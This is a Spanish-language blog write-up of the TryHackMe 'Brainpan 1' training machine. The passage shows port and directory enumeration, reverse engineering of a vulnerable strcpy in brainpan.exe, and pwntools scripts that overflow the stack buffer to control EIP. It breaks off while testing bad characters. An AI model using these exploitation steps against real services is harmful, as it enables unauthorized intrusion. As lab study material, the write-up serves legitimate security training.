<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Writeup TryHackMe Brainpan 1</title>

  <meta name="description" content="Resolución de la máquina Brainpan 1 de la plataforma de TryHackMe">
  <meta name="author" content="DarthBear">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Writeup TryHackMe Brainpan 1">
  <meta name="twitter:description" content="Resolución de la máquina Brainpan 1 de la plataforma de TryHackMe">
  <meta name="twitter:creator" content="DarthBear">  
  <meta name="twitter:image" content="/images/tryhackme/brainpan.png" />

  <meta property="og:site_name" content="DarthBear" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Writeup TryHackMe Brainpan 1">
  <meta property="og:description" content="Resolución de la máquina Brainpan 1 de la plataforma de TryHackMe">
  <meta property="og:image" content="/images/tryhackme/brainpan.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/tryhackme/brainpan.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Writeup TryHackMe Brainpan 1" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="DarthBear">
          <h1 class="panel-cover__title panel-title scale-up-center">DarthBear</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/tryhackme" title="DarthBear" class="blog-button">TryHackMe</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/kevincillo32" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://x.com/Bear00652327128" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/kevinch1106" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://www.youtube.com/@darthbear3654" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:kevincillo32@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#enumeration">Enumeración</a></li>
        <li><a href="#bof-stack">BOF - Stack Based</a></li>
        <li><a href="#shellcode">Shellcode Analisis</a></li>
        <li><a href="#shell-puck">Shell - puck</a></li>
        <li><a href="#shell-anansi">Shell - anansi</a></li>
        <li><a href="#shell-root">Shell - root</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">TryHackMe</h2>
    <picture><img src="/images/tryhackme/brainpan.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Brainpan 1</h2><br>
  </header>

<section class="post" id="enumeration">
<br><h3 class="post-title">Enumeración</h3><br>

<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code>, aunque realmente solo encontramos 2 puertos abiertos, el <code class="language-plaintext highlighter-rouge">9999</code> y el <code class="language-plaintext highlighter-rouge">10000</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nmap </span><span class="p">10.10.27.47
Nmap scan report for 10.10.27.47
PORT      STATE    SERVICE
9999/tcp  open     abyss
10000/tcp open     snet-sensor-mgmt  </span>
</code></pre></div></div><br>

<p class="plain-text">Al conectarnos con al puerto <code class="language-plaintext highlighter-rouge">9999</code> vemos programa que nos pide una <code class="language-plaintext highlighter-rouge">contraseña</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat </span><span class="p">10.10.27.47 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]  
                          ENTER THE PASSWORD                              

                          >></span>
</code></pre></div></div><br>

<p class="plain-text">Si enviamos una contraseña incorrecta nos devuelve <code class="language-plaintext highlighter-rouge">ACCESS DENIED</code> y termina</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">[________________________ WELCOME TO BRAINPAN _________________________]  
                          ENTER THE PASSWORD                            

                          >> 1234
                          ACCESS DENIED</span>
</code></pre></div></div><br>

<p class="plain-text">El puerto <code class="language-plaintext highlighter-rouge">10000</code> corre un servicio <code class="language-plaintext highlighter-rouge">http</code>, que en el index tiene solo una imagen que nos habla de vulnerabilidades comunes y tal, pero no nos aporta demasiado</p>
<a href="/tryhackme/brainpan/1.png" target="_blank"><div><p><img src="/tryhackme/brainpan/1.png"></p></div></a>

<p class="plain-text">Podemos usar <code class="language-plaintext highlighter-rouge">wfuzz</code> para aplicar fuerza bruta y encontramos un directorio <code class="language-plaintext highlighter-rouge">/bin</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.27.47:10000/FUZZ -t 100 --hc 404  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.27.47:10000/FUZZ
Total requests: 4713

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000854:   </span><span class="az">301</span><span class="p">        0 L      0 W        0 Ch        "bin"</span>
</code></pre></div></div><br>

<p class="plain-text">Si lo miramos desde el navegador podemos ver que tenemos capacidad de listar recursos, este directorio nos comparte un archivo llamado <code class="language-plaintext highlighter-rouge">brainpan.exe</code></p>
<a href="/tryhackme/brainpan/2.png" target="_blank"><div><p><img src="/tryhackme/brainpan/2.png"></p></div></a>

<p class="plain-text">Como es un archivo <code class="language-plaintext highlighter-rouge">exe</code> podemos pasarlo a una máquina <code class="language-plaintext highlighter-rouge">windows</code> y ejecutarlo, al hacerlo solo nos dice que se pone en espera de conexiones por el puerto <code class="language-plaintext highlighter-rouge">9999</code> </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="am">.\brainpan.exe  </span><span class="p">
[+] initializing winsock...done.
[+] server socket created.
[+] bind done on port 9999
[+] waiting for connections.</span>
</code></pre></div></div><br>

<p class="plain-text">Nos podemos conectar con <code class="language-plaintext highlighter-rouge">netcat</code> al puerto <code class="language-plaintext highlighter-rouge">9999</code> esta vez usando como direccion la ip de nuestra maquina <code class="language-plaintext highlighter-rouge">windows</code> y vemos la misma aplicación de antes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat </span><span class="p">192.168.100.5 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]  
                          ENTER THE PASSWORD                              

                          >></span>
</code></pre></div></div><br>

<p class="plain-text">Ya que esta corriendo en la máquina victima analizemos el ejecutable con <code class="language-plaintext highlighter-rouge">ida</code>, donde vemos la función <code class="language-plaintext highlighter-rouge">main</code> donde vemos todo su pseudocódigo <code class="language-plaintext highlighter-rouge">c</code></p>
<a href="/tryhackme/brainpan/3.png" target="_blank"><div><p><img src="/tryhackme/brainpan/3.png"></p></div></a>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">main</code> inicia un socket en el puerto 9999 y mostrar el banner, despues le pasa el buffer a <code class="language-plaintext highlighter-rouge">get_reply</code> y segun la respuesta muestra un mensaje u otro</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int </span><span class="p">__cdecl </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">argv</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">envp</span><span class="p">)
{
  </span><span class="no">void </span><span class="o">*</span><span class="p">stack; </span><span class="c1">// esp
  </span><span class="no">int </span><span class="p">winsock_error; </span><span class="c1">// eax
  </span><span class="no">int </span><span class="p">socket_error; </span><span class="c1">// eax
  </span><span class="no">int </span><span class="p">bind_error; </span><span class="c1">// eax
  </span><span class="no">int </span><span class="p">len_banner; </span><span class="c1">// eax
  </span><span class="no">int </span><span class="p">len_denied; </span><span class="c1">// eax
  </span><span class="no">int </span><span class="p">len_granted; </span><span class="c1">// eax
  </span><span class="no">int </span><span class="p">accept_error; </span><span class="c1">// eax
  </span><span class="no">struct </span><span class="p">sockaddr addr; </span><span class="c1">// [esp+30h] [ebp-5D8h] BYREF
  </span><span class="no">struct </span><span class="p">sockaddr name; </span><span class="c1">// [esp+40h] [ebp-5C8h] BYREF
  </span><span class="p">SOCKET client_socket; </span><span class="c1">// [esp+58h] [ebp-5B0h]
  </span><span class="p">SOCKET server_socket; </span><span class="c1">// [esp+5Ch] [ebp-5ACh]
  </span><span class="no">struct </span><span class="p">WSAData WSAData; </span><span class="c1">// [esp+60h] [ebp-5A8h] BYREF
  </span><span class="no">int </span><span class="p">reply; </span><span class="c1">// [esp+1F8h] [ebp-410h]
  </span><span class="no">int </span><span class="p">port; </span><span class="c1">// [esp+1FCh] [ebp-40Ch]
  </span><span class="no">int </span><span class="p">addrlen; </span><span class="c1">// [esp+200h] [ebp-408h] BYREF
  </span><span class="no">char </span><span class="o">*</span><span class="p">granted_message; </span><span class="c1">// [esp+204h] [ebp-404h]
  </span><span class="no">char </span><span class="o">*</span><span class="p">denied_message; </span><span class="c1">// [esp+208h] [ebp-400h]
  </span><span class="no">char </span><span class="o">*</span><span class="p">banner; </span><span class="c1">// [esp+20Ch] [ebp-3FCh]
  </span><span class="no">char </span><span class="p">buffer[</span><span class="mi">1016</span><span class="p">]; </span><span class="c1">// [esp+210h] [ebp-3F8h] BYREF

  </span><span class="p">stack </span><span class="o">= </span><span class="p">alloca(</span><span class="mi">16</span><span class="p">);
  __main();
  banner </span><span class="o">=</span><span class="s"> "_|                            _|                                        </span><span class="mi">\n</span><span class="s">"
           "_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><span class="mi">\n</span><span class="s">"
           "_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><span class="mi">\n</span><span class="s">"
           "_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><span class="mi">\n</span><span class="s">"
           "_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><span class="mi">\n</span><span class="s">"
           "                                            _|                          </span><span class="mi">\n</span><span class="s">"
           "                                            _|</span><span class="mi">\n</span><span class="s">"
           "</span><span class="mi">\n</span><span class="s">"
           "[________________________ WELCOME TO BRAINPAN _________________________]</span><span class="mi">\n</span><span class="s">"
           "                          ENTER THE PASSWORD                              </span><span class="mi">\n</span><span class="s">"  
           "</span><span class="mi">\n</span><span class="s">"
           "                          >> "</span><span class="p">;
  denied_message </span><span class="o">=</span><span class="s"> "                          ACCESS DENIED</span><span class="mi">\n</span><span class="s">"</span><span class="p">;
  granted_message </span><span class="o">=</span><span class="s"> "                          ACCESS GRANTED</span><span class="mi">\n</span><span class="s">"</span><span class="p">;
  port </span><span class="o">= </span><span class="mi">9999</span><span class="p">;
  reply </span><span class="o">= </span><span class="mi">1</span><span class="p">;
  </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] initializing winsock..."</span><span class="p">);
  </span><span class="o">if</span><span class="p"> ( WSAStartup(</span><span class="mi">0x202</span><span class="no">u</span><span class="p">, </span><span class="o">&</span><span class="p">WSAData) )
  {
    winsock_error </span><span class="o">= </span><span class="p">WSAGetLastError();
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[!] winsock init failed: </span><span class="mi">%d</span><span class="s">"</span><span class="p">, winsock_error);
  }
  </span><span class="o">else</span><span class="p">
  {
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"done.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
    server_socket </span><span class="o">= </span><span class="p">socket(</span><span class="mi">2</span><span class="p">, </span><span class="mi">1</span><span class="p">, </span><span class="mi">0</span><span class="p">);
    </span><span class="o">if</span><span class="p"> ( server_socket </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
    {
      socket_error </span><span class="o">= </span><span class="p">WSAGetLastError();
      </span><span class="no">printf</span><span class="p">(</span><span class="s">"[!] could not create socket: </span><span class="mi">%d</span><span class="s">"</span><span class="p">, socket_error);
    }
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] server socket created.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
    name.sa_family </span><span class="o">= </span><span class="mi">2</span><span class="p">;
    </span><span class="o">*</span><span class="p">(_DWORD </span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">name.sa_data[</span><span class="mi">2</span><span class="p">] </span><span class="o">= </span><span class="mi">0</span><span class="p">;
    </span><span class="o">*</span><span class="p">(_WORD </span><span class="o">*</span><span class="p">)name.sa_data </span><span class="o">= </span><span class="p">htons(</span><span class="mi">0x270F</span><span class="no">u</span><span class="p">);
    </span><span class="o">if</span><span class="p"> ( bind(server_socket, </span><span class="o">&</span><span class="p">name, </span><span class="mi">16</span><span class="p">) </span><span class="o">== -</span><span class="mi">1 </span><span class="p">)
    {
      bind_error </span><span class="o">= </span><span class="p">WSAGetLastError();
      </span><span class="no">printf</span><span class="p">(</span><span class="s">"[!] bind failed: </span><span class="mi">%d</span><span class="s">"</span><span class="p">, bind_error);
    }
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] bind done on port </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, port);
    listen(server_socket, </span><span class="mi">3</span><span class="p">);
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] waiting for connections.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
    addrlen </span><span class="o">= </span><span class="mi">16</span><span class="p">;
    </span><span class="o">while </span><span class="p">( </span><span class="mi">true</span><span class="p"> )
    {
      client_socket </span><span class="o">= </span><span class="p">accept(server_socket, </span><span class="o">&</span><span class="p">addr, </span><span class="o">&</span><span class="p">addrlen);
      </span><span class="o">if</span><span class="p"> ( client_socket </span><span class="o">== -</span><span class="mi">1 </span><span class="p">)
        </span><span class="o">break</span><span class="p">;
      </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] received connection.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
      </span><span class="no">memset</span><span class="p">(buffer, </span><span class="mi">0</span><span class="p">, </span><span class="mi">0x3E8</span><span class="no">u</span><span class="p">);
      len_banner </span><span class="o">= </span><span class="no">strlen</span><span class="p">(banner);
      send(client_socket, banner, len_banner, </span><span class="mi">0</span><span class="p">);
      recv(client_socket, buffer, </span><span class="mi">1000</span><span class="p">, </span><span class="mi">0</span><span class="p">);
      reply </span><span class="o">= </span><span class="p">get_reply(buffer);
      </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] check is </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, reply);
      </span><span class="o">if</span><span class="p"> ( get_reply(buffer) )
      {
        len_granted </span><span class="o">= </span><span class="no">strlen</span><span class="p">(granted_message);
        send(client_socket, denied_message, len_granted, </span><span class="mi">0</span><span class="p">);
      }
      </span><span class="o">else</span><span class="p">
      {
        len_denied </span><span class="o">= </span><span class="no">strlen</span><span class="p">(denied_message);
        send(client_socket, granted_message, len_denied, </span><span class="mi">0</span><span class="p">);
      }
      closesocket(client_socket);
    }
    accept_error </span><span class="o">= </span><span class="p">WSAGetLastError();
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[!] accept failed: </span><span class="mi">%d</span><span class="s">"</span><span class="p">, accept_error);
  }
  </span><span class="o">return </span><span class="mi">1</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Esta función esta usando <code class="language-plaintext highlighter-rouge">strcmp</code> para comparar nuestro input ingresado con la cadena <code class="language-plaintext highlighter-rouge">shitstorm</code>, asi que parece que tenemos la <code class="language-plaintext highlighter-rouge">contraseña</code> en texto plano</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int</span><span class="p"> __cdecl </span><span class="na">get_reply</span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="am">param_1</span><span class="p">)
{
  </span><span class="na">size_t </span><span class="p">len_password; </span><span class="c1">// eax
  </span><span class="no">char </span><span class="p">password[</span><span class="mi">520</span><span class="p">];</span><span class="c1"> // [esp+10h] [ebp-208h] BYREF

  </span><span class="no">printf</span><span class="p">(</span><span class="s">"[get_reply] s = [</span><span class="mi">%s</span><span class="s">]</span><span class="mi">\n</span><span class="s">"</span><span class="p">, param_1);
  </span><span class="no">strcpy</span><span class="p">(password, param_1);
  len_password </span><span class="o">= </span><span class="no">strlen</span><span class="p">(password);
  </span><span class="no">printf</span><span class="p">(</span><span class="s">"[get_reply] copied </span><span class="mi">%d </span><span class="s">bytes to buffer</span><span class="mi">\n</span><span class="p">", len_password);  
  </span><span class="o">return </span><span class="no">strcmp</span><span class="p">(password, </span><span class="s">"shitstorm</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
}</span>
</code></pre></div></div><br>

<p class="plain-text">Nos conectamos al puerto <code class="language-plaintext highlighter-rouge">9999</code> y enviamos la cadena <code class="language-plaintext highlighter-rouge">shitstorm</code> que encontramos, sin embargo aunque nos devuelve <code class="language-plaintext highlighter-rouge">ACCESS GRANTED</code> el programa termina ahi</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat </span><span class="p">10.10.27.47 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]  
                          ENTER THE PASSWORD                              

                          >> shitstorm
                          ACCESS GRANTED</span>
</code></pre></div></div><br>

<p class="plain-text">El verdadero problema es que esta usando la función <code class="language-plaintext highlighter-rouge">strcpy</code> con un buffer definido que solo es de <code class="language-plaintext highlighter-rouge">520</code> bytes, por lo que puede ser vulnerable a <code class="language-plaintext highlighter-rouge">Buffer Overflow</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">char </span><span class="p">password[</span><span class="mi">520</span><span class="p">];
</span><span class="no">strcpy</span><span class="p">(password, param_1);  </span>
</code></pre></div></div><br>

</section>

<section class="post" id="bof-stack">
<br><h3 class="post-title">Buffer Overflow - Stack Based</h3><br>

<p class="plain-text">Para trabajar con los registros usaremos <a href="https://x64dbg.com/">x32dbg</a> con el plugin <a href="https://github.com/x64dbg/x64dbgpy">x64dbgpy</a> y el modulo <a href="https://github.com/corelan/mona">mona</a>, asi que abrimos <code class="language-plaintext highlighter-rouge">brainpan.exe</code> y lo corremos, ademas de importar el modulo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">from mona import mona</span>
</code></pre></div></div><br>
<a href="/tryhackme/brainpan/5.png" target="_blank"><div><p><img src="/tryhackme/brainpan/5.png"></p></div></a>

<p class="plain-text">Necesitamos encontrar la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> necesarios antes de llegar a <code class="language-plaintext highlighter-rouge">EIP</code> creamos una cadena especial de <code class="language-plaintext highlighter-rouge">600</code> caracteres usando <code class="language-plaintext highlighter-rouge">pattern_create</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">mona("pattern_create 600")</span>
</code></pre></div></div><br>
<a href="/tryhackme/brainpan/19.png" target="_blank"><div><p><img src="/tryhackme/brainpan/19.png"></p></div></a>

<p class="plain-text">Esta vez como alternativa a <code class="language-plaintext highlighter-rouge">socket</code> podemos usar <code class="language-plaintext highlighter-rouge">remote</code> del modulo pwn, creamos una conexión y enviamos el patron generado antes con mona pattern_create</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

pattern </span><span class="o">= </span><span class="no">b</span><span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"  </span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

shell.sendline(pattern)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Corriendo ya el programa con ejecutamos el script para enviar la cadena de caracteres</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
</code></pre></div></div><br>

<p class="plain-text">Volvemos al <code class="language-plaintext highlighter-rouge">x32dbg</code> y podemos ver que el programa se corrompe, el valor de <code class="language-plaintext highlighter-rouge">EIP</code> nos ayudara a saber los <code class="language-plaintext highlighter-rouge">bytes</code> necesarios antes de llegar a este registo</p>
<a href="/tryhackme/brainpan/6.png" target="_blank"><div><p><img src="/tryhackme/brainpan/6.png"></p></div></a>

<p class="plain-text">Al pasarle el valor de <code class="language-plaintext highlighter-rouge">EIP</code> a <code class="language-plaintext highlighter-rouge">pattern_offset</code> nos devuelve el <code class="language-plaintext highlighter-rouge">offset</code>, <code class="language-plaintext highlighter-rouge">524</code> caracteres son necesarios antes de sobreescribir el registro <code class="language-plaintext highlighter-rouge">EIP</code> en el programa</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">mona("pattern_offset 35724134")</span>
</code></pre></div></div><br>
<a href="/tryhackme/brainpan/20.png" target="_blank"><div><p><img src="/tryhackme/brainpan/20.png"></p></div></a>

<p class="plain-text">Nuestro script para comprobar enviara <code class="language-plaintext highlighter-rouge">524</code> bytes de <code class="language-plaintext highlighter-rouge">junk</code> y <code class="language-plaintext highlighter-rouge">4 B</code> que simulan el EIP</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">= </span><span class="mi">524</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
eip </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">eip

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)  

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Corremos de nuevo el <code class="language-plaintext highlighter-rouge">exe</code> y al ejecutar el script podemos ver reflejadas las <code class="language-plaintext highlighter-rouge">4 B</code> en el registro <code class="language-plaintext highlighter-rouge">EIP</code> significa que nuestro offset de <code class="language-plaintext highlighter-rouge">524</code> bytes es correcto</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
</code></pre></div></div><br>
<a href="/tryhackme/brainpan/7.png" target="_blank"><div><p><img src="/tryhackme/brainpan/7.png"></p></div></a>

<p class="plain-text">Lo siguiente sera detectar <code class="language-plaintext highlighter-rouge">badchars</code> por lo que con <code class="language-plaintext highlighter-rouge">mona</code> crearemos una lista con todos los caracteres posibles, esto nos creara un archivo <code class="language-plaintext highlighter-rouge">txt</code> y un <code class="language-plaintext highlighter-rouge">bin</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">mona("bytearray")</span>
</code></pre></div></div><br>
<a href="/tryhackme/brainpan/8.png" target="_blank"><div><p><img src="/tryhackme/brainpan/8.png"></p></div></a>

<p class="plain-text">Modificaremos el script para que despues del <code class="language-plaintext highlighter-rouge">EIP</code> envie nuestros posibles badchars</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">=</span><span class="mi"> 524</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
eip </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">

badchars </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s">"</span><span class="p">
